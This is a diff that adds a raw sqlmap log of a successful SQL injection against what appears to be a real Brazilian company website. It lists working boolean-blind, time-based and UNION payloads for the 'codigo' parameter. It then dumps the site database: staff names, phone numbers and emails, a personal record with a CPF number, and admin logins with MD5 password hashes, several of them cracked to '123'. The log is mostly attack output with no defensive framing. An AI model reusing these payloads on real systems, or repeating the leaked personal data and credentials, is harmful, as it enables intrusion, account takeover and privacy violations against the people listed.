@@ -1,0 +1,414 @@
+sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=6 AND 6447=6447
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: codigo=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: codigo=6 UNION ALL SELECT NULL,CONCAT(0x716b7a7a71,0x624f6a4665685678596e4758546455504a566b674f4f48455642696b43695078737345506a71474f,0x7176627171),NULL,NULL-- DiOF
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.32, Nginx
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] admin_brgsite
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=6 AND 6447=6447
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: codigo=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: codigo=6 UNION ALL SELECT NULL,CONCAT(0x716b7a7a71,0x624f6a4665685678596e4758546455504a566b674f4f48455642696b43695078737345506a71474f,0x7176627171),NULL,NULL-- DiOF
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.32, Nginx
+back-end DBMS: MySQL >= 5.0.12
+Database: admin_brgsite
+[18 tables]
++------------------+
+| caracteristica   |
+| cat_clientes     |
+| cat_contatos     |
+| cat_fotos        |
+| cat_noticias     |
+| clientes         |
+| contatos         |
+| cursoBRG         |
+| fotos            |
+| mapa_assistencia |
+| marca            |
+| menus            |
+| noticias         |
+| prod_carac       |
+| produto          |
+| sitemenu         |
+| texto_empresa    |
+| usuario          |
++------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=6 AND 6447=6447
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: codigo=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: codigo=6 UNION ALL SELECT NULL,CONCAT(0x716b7a7a71,0x624f6a4665685678596e4758546455504a566b674f4f48455642696b43695078737345506a71474f,0x7176627171),NULL,NULL-- DiOF
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.32, Nginx
+back-end DBMS: MySQL >= 5.0.12
+Database: admin_brgsite
+[18 tables]
++------------------+
+| caracteristica   |
+| cat_clientes     |
+| cat_contatos     |
+| cat_fotos        |
+| cat_noticias     |
+| clientes         |
+| contatos         |
+| cursoBRG         |
+| fotos            |
+| mapa_assistencia |
+| marca            |
+| menus            |
+| noticias         |
+| prod_carac       |
+| produto          |
+| sitemenu         |
+| texto_empresa    |
+| usuario          |
++------------------+
+
+Database: admin_brgsite
+Table: caracteristica
+[16 entries]
++------------------+-------------------+---------+-----------------------------------------------+------------------+
+| idCaracteristica | nome              | visivel | descricao                                     | usuario_cadastro |
++------------------+-------------------+---------+-----------------------------------------------+------------------+
+| 1                | Modelo Gerador    | 1       | Modelo do Gerador                             | 1                |
+| 2                | Stand-By          | 1       | (kVA/kWe)                                     | 1                |
+| 3                | Prime             | 1       | (kVA/kWe)                                     | 1                |
+| 4                | Modelo Motor      | 1       | Modelo do motor                               | 1                |
+| 5                | Modelo Alternador | 1       | Modelo do Alternador                          | 1                |
+| 6                | Potência          | 1       | Potência geral da máquina                     | 1                |
+| 7                | Vantagens         | 1       | Vantagens gerais da máquina                   | 1                |
+| 8                | Qtd. Motores      | 1       | Quantidade de motores no Grupo Gerador        | 1                |
+| 9                | Dimensões         | 1       | Comprimento x Largura x Altura (Milímetros)   | 1                |
+| 10               | Peso              | 1       | Peso do gerador(kg)                           | 1                |
+| 11               | Minitexto         | 1       | Texto pequeno da parte da busca               | 1                |
+| 12               | Plataforma        | 1       | Plataforma em que o software está disponí­vel | 1                |
+| 13               | Monitoramento     | 1       | O que monitora este software                  | 1                |
+| 14               | Parâmetros        | 1       | Quais os parâmetros                           | 1                |
+| 15               | Controlador       | 1       | Marca do controlador utilizado no painel      | 1                |
+| 16               | Características   | 1       | Lista de caracterí­sticas                     | 1                |
++------------------+-------------------+---------+-----------------------------------------------+------------------+
+
+Database: admin_brgsite
+Table: cat_clientes
+[7 entries]
++----------------+----------------------------------------------+-------+---------+------------------+
+| idCat_clientes | nome                                         | ordem | visivel | usuario_cadastro |
++----------------+----------------------------------------------+-------+---------+------------------+
+| 1              | Locadoras e Termelétricas                    | 1     | 1       | 1                |
+| 2              | Shoppings, Clubes e Hotéis                   | 2     | 1       | 1                |
+| 3              | Alimentos                                    | 3     | 1       | 1                |
+| 4              | Plásticos                                    | 4     | 1       | 1                |
+| 5              | Farmoquí­micos                               | 5     | 1       | 1                |
+| 6              | Logística, Centros de Distribuição e Bebidas | 6     | 1       | 1                |
+| 7              | Autorizadas                                  | 1     | 1       | 1                |
++----------------+----------------------------------------------+-------+---------+------------------+
+
+Database: admin_brgsite
+Table: cat_contatos
+[7 entries]
++---------+----------------+---------+----------------------------------------+---------+---------+-------+---------+---------+---------+----------+---------------+------------------+
+| cidade  | idCat_contatos | cep     | nome                                   | fone    | site    | ordem | email   | estado  | visivel | endereco | permite_email | usuario_cadastro |
++---------+----------------+---------+----------------------------------------+---------+---------+-------+---------+---------+---------+----------+---------------+------------------+
+| <blank> | 1              | <blank> | Pecas                                  | <blank> | <blank> | 1     | <blank> | <blank> | 0       | <blank>  | 0             | 1                |
+| <blank> | 2              | <blank> | Comercial                              | <blank> | <blank> | 2     | <blank> | <blank> | 1       | <blank>  | 1             | 1                |
+| <blank> | 3              | <blank> | Engenharia e Assist\xeancia T\xe9cnica | <blank> | <blank> | 3     | <blank> | <blank> | 1       | <blank>  | 1             | 3                |
+| <blank> | 4              | <blank> | Autorizadas                            | <blank> | <blank> | 1     | <blank> | <blank> | 0       | <blank>  | 0             | 1                |
+| NULL    | 5              | NULL    | Vendas                                 | NULL    | NULL    | 4     | NULL    | NULL    | 0       | NULL     | 0             | 1                |
+| NULL    | 6              | NULL    | Compras                                | NULL    | NULL    | 5     | NULL    | NULL    | 1       | NULL     | 1             | 1                |
+| NULL    | 7              | NULL    | RH                                     | NULL    | NULL    | 7     | NULL    | NULL    | 1       | NULL     | 1             | 1                |
++---------+----------------+---------+----------------------------------------+---------+---------+-------+---------+---------+---------+----------+---------------+------------------+
+
+Database: admin_brgsite
+Table: cat_fotos
+[5 entries]
++-------------+----------+-------+---------+--------------------------------+------------------+
+| idCat_fotos | nome     | ordem | visivel | descricao                      | usuario_cadastro |
++-------------+----------+-------+---------+--------------------------------+------------------+
+| 1           | Noticias | 1     | 0       | Notícias                       | 2                |
+| 3           | Website  | 1     | 0       | Imagens do Site em si !        | 1                |
+| 4           | Slider   | 1     | 1       | Slider da página principal     | 1                |
+| 5           | Produtos | 3     | 1       | Imagens de produtos da empresa | 1                |
+| 6           | Folders  | 3     | 1       | Especificações de produtos     | 1                |
++-------------+----------+-------+---------+--------------------------------+------------------+
+
+Database: admin_brgsite
+Table: cat_noticias
+[4 entries]
++----------------+--------------+-------+---------+------------------------------------------------------+------------------+
+| idCat_Noticias | nome         | ordem | visivel | descricao                                            | usuario_cadastro |
++----------------+--------------+-------+---------+------------------------------------------------------+------------------+
+| 8              | Artigos      | 1     | 1       | Coletânea de artigos sobre a Transbraz/BRG Geradores | 1                |
+| 9              | Supervisorio | 1     | 1       | Sistemas de supervisão                               | 1                |
+| 10             | Parcerias    | 1     | 1       | Parcerias da BRG Geradores                           | 1                |
+| 11             | Exterior     | 3     | 1       | Notícias sobre a BRG Geradores no Exterior           | 1                |
++----------------+--------------+-------+---------+------------------------------------------------------+------------------+
+
+Database: admin_brgsite
+Table: clientes
+[5 entries]
++------------+------------------------+------------------------------------+-----------------+-------+---------+---------------+------------------+
+| idClientes | nome                   | site                               | logo            | ordem | visivel | cod_categoria | usuario_cadastro |
++------------+------------------------+------------------------------------+-----------------+-------+---------+---------------+------------------+
+| 6          | Gera Center            | www.geracenter.com.br              | geracenter.png  | 6     | 1       | 1             | 1                |
+| 8          | GeraforÃ§a             | www.geraforca.com.br/geraforca.php | geraforca.png   | 8     | 1       | 1             | 1                |
+| 24         | Mega Plast             | <blank>                            | megaplast.png   | 1     | 1       | 4             | 1                |
+| 26         | IndÃºstria Bandeirante | <blank>                            | bandeirante.png | 3     | 1       | 4             | 1                |
+| 41         | CROSS Locadora         | www.crosslocadora.com.br           | logocross.jpg   | 1     | 1       | 1             | 1                |
++------------+------------------------+------------------------------------+-----------------+-------+---------+---------------+------------------+
+
+Database: admin_brgsite
+Table: contatos
+[6 entries]
++------------+------------------+-----------------+-------+---------+---------------------------------+---------+-------------+---------------+------------------+
+| idContatos | nome             | fone            | ordem | skype   | email                           | visivel | cod_contato | permite_email | usuario_cadastro |
++------------+------------------+-----------------+-------+---------+---------------------------------+---------+-------------+---------------+------------------+
+| 1          | David Martins    | (62) 98117-7146 | 1     | <blank> | comercial@brggeradores.com.br   | 1       | 2           | 0             | 1                |
+| 2          | Marcelo Oliveira | (62) 99840-9659 | 1     | <blank> | vendas@brggeradores.com.br      | 0       | 5           | 1             | 1                |
+| 3          | Lauro Peixoto    | (62) 99966-4129 | 1     | <blank> | lauro@brggeradores.com.br       | 1       | 3           | 1             | 1                |
+| 4          | Alex Borges      | (62) 93333-0000 | 1     | <blank> | alex.borges@brggeradores.com.br | 0       | 2           | 0             | 1                |
+| 5          | Cristiano Passos | (62) 3771-2577  | 3     | NULL    | compras@brggeradores.com.br     | 1       | 6           | 1             | 1                |
+| 6          | Rafaela Abdala   | (62) 3771-2540  | 5     | NULL    | rh@brggeradores.com.br          | 1       | 7           | 1             | 1                |
++------------+------------------+-----------------+-------+---------+---------------------------------+---------+-------------+---------------+------------------+
+
+Database: admin_brgsite
+Table: cursoBRG
+[0 entries]
++-----------+---------+
+| end       | local   |
++-----------+---------+
++-----------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=6 AND 6447=6447
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: codigo=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: codigo=6 UNION ALL SELECT NULL,CONCAT(0x716b7a7a71,0x624f6a4665685678596e4758546455504a566b674f4f48455642696b43695078737345506a71474f,0x7176627171),NULL,NULL-- DiOF
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.32, Nginx
+back-end DBMS: MySQL >= 5.0.12
+Database: admin_brgsite
+[18 tables]
++------------------+
+| caracteristica   |
+| cat_clientes     |
+| cat_contatos     |
+| cat_fotos        |
+| cat_noticias     |
+| clientes         |
+| contatos         |
+| cursoBRG         |
+| fotos            |
+| mapa_assistencia |
+| marca            |
+| menus            |
+| noticias         |
+| prod_carac       |
+| produto          |
+| sitemenu         |
+| texto_empresa    |
+| usuario          |
++------------------+
+
+Database: admin_brgsite
+Table: caracteristica
+[16 entries]
++------------------+-------------------+---------+-----------------------------------------------+------------------+
+| idCaracteristica | nome              | visivel | descricao                                     | usuario_cadastro |
++------------------+-------------------+---------+-----------------------------------------------+------------------+
+| 1                | Modelo Gerador    | 1       | Modelo do Gerador                             | 1                |
+| 2                | Stand-By          | 1       | (kVA/kWe)                                     | 1                |
+| 3                | Prime             | 1       | (kVA/kWe)                                     | 1                |
+| 4                | Modelo Motor      | 1       | Modelo do motor                               | 1                |
+| 5                | Modelo Alternador | 1       | Modelo do Alternador                          | 1                |
+| 6                | Potência          | 1       | Potência geral da máquina                     | 1                |
+| 7                | Vantagens         | 1       | Vantagens gerais da máquina                   | 1                |
+| 8                | Qtd. Motores      | 1       | Quantidade de motores no Grupo Gerador        | 1                |
+| 9                | Dimensões         | 1       | Comprimento x Largura x Altura (Milímetros)   | 1                |
+| 10               | Peso              | 1       | Peso do gerador(kg)                           | 1                |
+| 11               | Minitexto         | 1       | Texto pequeno da parte da busca               | 1                |
+| 12               | Plataforma        | 1       | Plataforma em que o software está disponí­vel | 1                |
+| 13               | Monitoramento     | 1       | O que monitora este software                  | 1                |
+| 14               | Parâmetros        | 1       | Quais os parâmetros                           | 1                |
+| 15               | Controlador       | 1       | Marca do controlador utilizado no painel      | 1                |
+| 16               | Características   | 1       | Lista de caracterí­sticas                     | 1                |
++------------------+-------------------+---------+-----------------------------------------------+------------------+
+
+Database: admin_brgsite
+Table: cat_clientes
+[7 entries]
++----------------+----------------------------------------------+-------+---------+------------------+
+| idCat_clientes | nome                                         | ordem | visivel | usuario_cadastro |
++----------------+----------------------------------------------+-------+---------+------------------+
+| 1              | Locadoras e Termelétricas                    | 1     | 1       | 1                |
+| 2              | Shoppings, Clubes e Hotéis                   | 2     | 1       | 1                |
+| 3              | Alimentos                                    | 3     | 1       | 1                |
+| 4              | Plásticos                                    | 4     | 1       | 1                |
+| 5              | Farmoquí­micos                               | 5     | 1       | 1                |
+| 6              | Logística, Centros de Distribuição e Bebidas | 6     | 1       | 1                |
+| 7              | Autorizadas                                  | 1     | 1       | 1                |
++----------------+----------------------------------------------+-------+---------+------------------+
+
+Database: admin_brgsite
+Table: cat_contatos
+[7 entries]
++---------+----------------+---------+----------------------------------------+---------+---------+-------+---------+---------+---------+----------+---------------+------------------+
+| cidade  | idCat_contatos | cep     | nome                                   | fone    | site    | ordem | email   | estado  | visivel | endereco | permite_email | usuario_cadastro |
++---------+----------------+---------+----------------------------------------+---------+---------+-------+---------+---------+---------+----------+---------------+------------------+
+| <blank> | 1              | <blank> | Pecas                                  | <blank> | <blank> | 1     | <blank> | <blank> | 0       | <blank>  | 0             | 1                |
+| <blank> | 2              | <blank> | Comercial                              | <blank> | <blank> | 2     | <blank> | <blank> | 1       | <blank>  | 1             | 1                |
+| <blank> | 3              | <blank> | Engenharia e Assist\xeancia T\xe9cnica | <blank> | <blank> | 3     | <blank> | <blank> | 1       | <blank>  | 1             | 3                |
+| <blank> | 4              | <blank> | Autorizadas                            | <blank> | <blank> | 1     | <blank> | <blank> | 0       | <blank>  | 0             | 1                |
+| NULL    | 5              | NULL    | Vendas                                 | NULL    | NULL    | 4     | NULL    | NULL    | 0       | NULL     | 0             | 1                |
+| NULL    | 6              | NULL    | Compras                                | NULL    | NULL    | 5     | NULL    | NULL    | 1       | NULL     | 1             | 1                |
+| NULL    | 7              | NULL    | RH                                     | NULL    | NULL    | 7     | NULL    | NULL    | 1       | NULL     | 1             | 1                |
++---------+----------------+---------+----------------------------------------+---------+---------+-------+---------+---------+---------+----------+---------------+------------------+
+
+Database: admin_brgsite
+Table: cat_fotos
+[5 entries]
++-------------+----------+-------+---------+--------------------------------+------------------+
+| idCat_fotos | nome     | ordem | visivel | descricao                      | usuario_cadastro |
++-------------+----------+-------+---------+--------------------------------+------------------+
+| 1           | Noticias | 1     | 0       | Notícias                       | 2                |
+| 3           | Website  | 1     | 0       | Imagens do Site em si !        | 1                |
+| 4           | Slider   | 1     | 1       | Slider da página principal     | 1                |
+| 5           | Produtos | 3     | 1       | Imagens de produtos da empresa | 1                |
+| 6           | Folders  | 3     | 1       | Especificações de produtos     | 1                |
++-------------+----------+-------+---------+--------------------------------+------------------+
+
+Database: admin_brgsite
+Table: cat_noticias
+[4 entries]
++----------------+--------------+-------+---------+------------------------------------------------------+------------------+
+| idCat_Noticias | nome         | ordem | visivel | descricao                                            | usuario_cadastro |
++----------------+--------------+-------+---------+------------------------------------------------------+------------------+
+| 8              | Artigos      | 1     | 1       | Coletânea de artigos sobre a Transbraz/BRG Geradores | 1                |
+| 9              | Supervisorio | 1     | 1       | Sistemas de supervisão                               | 1                |
+| 10             | Parcerias    | 1     | 1       | Parcerias da BRG Geradores                           | 1                |
+| 11             | Exterior     | 3     | 1       | Notícias sobre a BRG Geradores no Exterior           | 1                |
++----------------+--------------+-------+---------+------------------------------------------------------+------------------+
+
+Database: admin_brgsite
+Table: clientes
+[5 entries]
++------------+------------------------+------------------------------------+-----------------+-------+---------+---------------+------------------+
+| idClientes | nome                   | site                               | logo            | ordem | visivel | cod_categoria | usuario_cadastro |
++------------+------------------------+------------------------------------+-----------------+-------+---------+---------------+------------------+
+| 6          | Gera Center            | www.geracenter.com.br              | geracenter.png  | 6     | 1       | 1             | 1                |
+| 8          | GeraforÃ§a             | www.geraforca.com.br/geraforca.php | geraforca.png   | 8     | 1       | 1             | 1                |
+| 24         | Mega Plast             | <blank>                            | megaplast.png   | 1     | 1       | 4             | 1                |
+| 26         | IndÃºstria Bandeirante | <blank>                            | bandeirante.png | 3     | 1       | 4             | 1                |
+| 41         | CROSS Locadora         | www.crosslocadora.com.br           | logocross.jpg   | 1     | 1       | 1             | 1                |
++------------+------------------------+------------------------------------+-----------------+-------+---------+---------------+------------------+
+
+Database: admin_brgsite
+Table: contatos
+[6 entries]
++------------+------------------+-----------------+-------+---------+---------------------------------+---------+-------------+---------------+------------------+
+| idContatos | nome             | fone            | ordem | skype   | email                           | visivel | cod_contato | permite_email | usuario_cadastro |
++------------+------------------+-----------------+-------+---------+---------------------------------+---------+-------------+---------------+------------------+
+| 1          | David Martins    | (62) 98117-7146 | 1     | <blank> | comercial@brggeradores.com.br   | 1       | 2           | 0             | 1                |
+| 2          | Marcelo Oliveira | (62) 99840-9659 | 1     | <blank> | vendas@brggeradores.com.br      | 0       | 5           | 1             | 1                |
+| 3          | Lauro Peixoto    | (62) 99966-4129 | 1     | <blank> | lauro@brggeradores.com.br       | 1       | 3           | 1             | 1                |
+| 4          | Alex Borges      | (62) 93333-0000 | 1     | <blank> | alex.borges@brggeradores.com.br | 0       | 2           | 0             | 1                |
+| 5          | Cristiano Passos | (62) 3771-2577  | 3     | NULL    | compras@brggeradores.com.br     | 1       | 6           | 1             | 1                |
+| 6          | Rafaela Abdala   | (62) 3771-2540  | 5     | NULL    | rh@brggeradores.com.br          | 1       | 7           | 1             | 1                |
++------------+------------------+-----------------+-------+---------+---------------------------------+---------+-------------+---------------+------------------+
+
+Database: admin_brgsite
+Table: cursoBRG
+[1 entry]
++----+---------+--------------+----------------+------------------------+------------------------------------+-------+---------------------------+------------+------------+-------------+------------+-----------+---------------------+-------------+
+| id | idPag   | escolaridade | cpf            | nome                   | end                                | curso | email                     | dtPag      | dtnasc     | local       | telefone   | statusPag | timestamp           | habilitacao |
++----+---------+--------------+----------------+------------------------+------------------------------------+-------+---------------------------+------------+------------+-------------+------------+-----------+---------------------+-------------+
+| 1  | <blank> | 1            | 058.126.551-38 | Matheus Santos e Silva | 62.43.033                          | 1     | david@brggeradores.com.br | 2017-11-01 | 2017-11-01 | Anápolis    | 6233330000 | 1         | 2017-11-08 15:41:49 | 123         |
++----+---------+--------------+----------------+------------------------+------------------------------------+-------+---------------------------+------------+------------+-------------+------------+-----------+---------------------+-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=6 AND 6447=6447
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: codigo=6 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: codigo=6 UNION ALL SELECT NULL,CONCAT(0x716b7a7a71,0x624f6a4665685678596e4758546455504a566b674f4f48455642696b43695078737345506a71474f,0x7176627171),NULL,NULL-- DiOF
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.32, Nginx
+back-end DBMS: MySQL >= 5.0.12
+Database: admin_brgsite
+Table: usuario
+[4 entries]
++-----------+-------------+----------------------------------------+------------+---------+
+| idUsuario | nome        | senha                                  | login      | visivel |
++-----------+-------------+----------------------------------------+------------+---------+
+| 1         | Saint Clair | 202cb962ac59075b964b07152d234b70 (123) | saintclair | 1       |
+| 2         | Hugo        | 202cb962ac59075b964b07152d234b70 (123) | hugo       | 1       |
+| 3         | Giulliana   | 202cb962ac59075b964b07152d234b70 (123) | giu        | 1       |
+| 4         | Murray      | 01049a5897c1051c0d8e789130459c51       | murray     | 1       |
++-----------+-------------+----------------------------------------+------------+---------+
+
